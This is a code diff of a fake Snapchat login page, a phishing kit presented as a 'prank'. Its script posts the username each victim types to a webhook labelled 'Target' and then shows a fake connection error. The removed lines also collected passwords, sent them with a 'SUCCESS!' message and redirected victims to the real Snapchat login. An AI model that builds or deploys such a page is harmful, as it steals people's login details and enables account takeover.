@@ -12,25 +12,8 @@
             flex-direction: column;
             align-items: center;
             margin: 0;
-            padding-top: 50px;
+            padding-top: 40px;
         }
-
-        #error-banner {
-            display: none;
-            background-color: #fff;
-            color: #333;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 14px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-            border: 1px solid #eee;
-        }
-
-        .error-bold { color: #e74c3c; font-weight: bold; }
 
         .login-card {
             background: white;
@@ -43,16 +26,13 @@
             box-sizing: border-box;
         }
 
-        .snap-logo {
-            width: 60px;
-            height: auto;
+        /* The Ghost Logo Fix */
+        .snap-ghost {
+            width: 55px;
             margin-bottom: 15px;
         }
 
         h2 { font-size: 26px; margin: 0 0 20px 0; font-weight: 700; color: #16191c; }
-
-        .user-display { font-size: 14px; margin-bottom: 25px; color: #16191c; font-weight: 500; }
-        .not-you { color: #00b2ff; text-decoration: none; font-size: 13px; margin-left: 5px; cursor: pointer; }
 
         .input-group { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 12px; color: #717274; margin-bottom: 8px; font-weight: 600; }
@@ -97,43 +77,28 @@
 </head>
 <body>
 
-    <div id="error-banner">
-        <span class="error-bold">Uh oh!</span> Unfortunately, Google sign-in is unavailable at this current moment.
-    </div>
+    <div class="login-card">
+        <svg class="snap-ghost" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <path fill="white" stroke="black" stroke-width="4" d="M50,15.5c-14.4,0-23.4,9.9-23.4,22.8c0,4.8,1.2,9.6,4.5,13.2c-0.6,2.1-1.2,4.8-1.2,7.5 c0,7.2,5.7,12.3,13.5,12.3c0.9,0,1.8,0,2.7-0.3c0,0.3,0,0.6,0,0.9c0,5.7,4.8,10.2,10.8,10.2s10.8-4.5,10.8-10.2 c0-0.3,0-0.6,0-0.9c0.9,0.3,1.8,0.3,2.7,0.3c7.8,0,13.5-5.1,13.5-12.3c0-2.7-0.6-5.4-1.2-7.5c3.3-3.6,4.5-8.4,4.5-13.2 C73.4,25.4,64.4,15.5,50,15.5z"/>
+        </svg>
 
-    <div class="login-card" id="step1">
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAMAAAAnE9FfAAAAbFBMVEUAAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAADw0X7zAAAAI3RSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIitSbuEAAAE0SURBVEjH7ZTXSgMxEEUj6m6Mvffe477//z8L7EZZSBB868B7z8ycYSaZpAn8U8onY3yIn6I/E16J+6I7E1YJByI+6fAonIkRCD8V67XoWPhZcSe6K0f0TdgR0U7HQuHInYnuatpU0U7HAnWiu5pqU0U7HevUie5q2lTRTse6daK7mmpTRTsd69aJ7mrqVNFNR1unO6I9O9Xp2KROdFdTr4p2OjanE93V1KuinY4N6UR3NfWqaKdjiS8T3dW0qaKdjk3oRHc1batop2OLOdFdTZsq2unYoE50V9OmisYf5n7oE93VtKmip869mPrE7pXozit2r0R3NfWpaKtj43Siu5p6VbTTsYlOdFfTpop2Oja7f67D6+U8fJzP6vY/oK9Tf+mK6O9S5yX6PZof/L0Fv2yZBy22YpSIAAAAAElFTkSuQmCC" class="snap-logo">
-        
         <h2>Log in to Snapchat</h2>
         
         <div class="input-group">
             <label id="inputLabel">Username or Email</label>
-            <input type="text" id="userInput" required>
+            <input type="text" id="userInput">
         </div>
         
         <a class="blue-link" id="toggleLink" onclick="toggleInputType()">Use phone number instead</a>
+        
         <button class="next-btn" onclick="goToStep2()">Next</button>
         
         <div class="divider">OR</div>
         
-        <button class="google-btn" onclick="showError()">
-            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCIgd2lkdGg9IjQ4IiBoZWlnaHQ9IjQ4Ij48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNMjQgOS41YzMuNTQgMCA2LjcxIDEuMjIgOS4yMSAzLjZsNi44NS02Ljg1QzM1LjkgMi4zOCAzMC40NyAwIDI0IDAgMTQuNjIgMCA2LjUxIDUuMzggMi41NiAxMy4yMmw3Ljk4IDYuMTlDMTIuNDMgMTMuNzIgMTcuNzQgOS41IDI0IDkuNXoiLz48cGF0aCBmaWxsPSIjNDI4NUY0IiBkPSJNNDYuOTggMjQuNTVjMC0xLjU3LS4xNS0zLjA5LS4zOC00LjU1SDI0djkuMDJoMTIuOTRjLS41OCAyLjk2LTIuMjYgNS40OC00Ljc4IDcuMThsNy43MyA2YzQuNTEtNC4xOCA3LjA5LTEwLjM2IDcuMDktMTcuNjV6Ii8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTTEwLjUzIDI4LjU5Yy0uNDgtMS40NS0uNzYtMi45OS0uNzYtNC41OXMuMjctMy4xNC43Ni00LjU5bC03Ljk4LTYuMTlDLjkyIDE2LjQ2IDAgMjAuMTIgMCAyNCAwIDM3Ljg4LjkyIDQxLjU0IDIuNTYgNDQuNzhsNy45Ny02LjE5eiIvPjxwYXRoIGZpbGw9IiMzNEE4NTMiIGQ9Ik0yNCA0OGM2LjQ4IDAgMTEuOTMtMi4xMyAxNS44OS01LjgxbC03LjczLTZjLTIuMTUgMS40NS00LjkyIDIuMy04LjE2IDIuMy02LjI2IDAtMTEuNTctNC4yMi0xMy40Ny05LjkxbC03Ljk4IDYuMTlDNi41MSA0Mi42MiAxNC42MiA0OCAyNCA0OHoiLz48L3N2Zz4=" class="google-icon">
+        <button class="google-btn">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Color_Icon.svg" class="google-icon">
             Continue with Google
         </button>
-    </div>
-
-    <div class="login-card" id="step2" style="display: none;">
-        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAMAAAAnE9FfAAAAbFBMVEUAAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAAD///8AAADw0X7zAAAAI3RSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIitSbuEAAAE0SURBVEjH7ZTXSgMxEEUj6m6Mvffe477//z8L7EZZSBB868B7z8ycYSaZpAn8U8onY3yIn6I/E16J+6I7E1YJByI+6fAonIkRCD8V67XoWPhZcSe6K0f0TdgR0U7HQuHInYnuatpU0U7HAnWiu5pqU0U7HevUie5q2lTRTse6daK7mmpTRTsd69aJ7mrqVNFNR1unO6I9O9Xp2KROdFdTr4p2OjanE93V1KuinY4N6UR3NfWqaKdjiS8T3dW0qaKdjk3oRHc1batop2OLOdFdTZsq2unYoE50V9OmisYf5n7oE93VtKmip869mPrE7pXozit2r0R3NfWpaKtj43Siu5p6VbTTsYlOdFfTpop2Oja7f67D6+U8fJzP6vY/oK9Tf+mK6O9S5yX6PZof/L0Fv2yZBy22YpSIAAAAAElFTkSuQmCC" class="snap-logo">
-        <h2>Enter Password</h2>
-        <div class="user-display">
-            <span id="displayEmail"></span><a class="not-you" onclick="location.reload()">Not you?</a>
-        </div>
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="passInput" required>
-        </div>
-        <a class="blue-link">Forgot Password</a>
-        <button class="next-btn" onclick="finishPrank()">Next</button>
     </div>
 
     <div class="back-nav" onclick="location.reload()">BACK</div>
@@ -145,46 +110,25 @@
         function toggleInputType() {
             const label = document.getElementById('inputLabel');
             const link = document.getElementById('toggleLink');
-            const input = document.getElementById('userInput');
             isPhoneMode = !isPhoneMode;
             if (isPhoneMode) {
                 label.innerText = "Phone Number";
                 link.innerText = "Use email instead";
-                input.type = "tel";
             } else {
                 label.innerText = "Username or Email";
                 link.innerText = "Use phone number instead";
-                input.type = "text";
             }
-        }
-
-        function showError() {
-            document.getElementById('error-banner').style.display = 'block';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function goToStep2() {
             const user = document.getElementById('userInput').value;
             if(!user) return;
-            document.getElementById('displayEmail').innerText = user;
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📱 **Login Attempt:** ${user}` })
-            });
-        }
-
-        function finishPrank() {
-            const pass = document.getElementById('passInput').value;
-            const user = document.getElementById('userInput').value;
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `🔑 **SUCCESS!**\nTarget: ${user}\nPass: ${pass}` })
+                body: JSON.stringify({ content: `📱 **Target:** ${user}` })
             }).then(() => {
-                window.location.href = "https://accounts.snapchat.com/accounts/login";
+                alert("Login Error: Please check your connection.");
             });
         }
     </script>
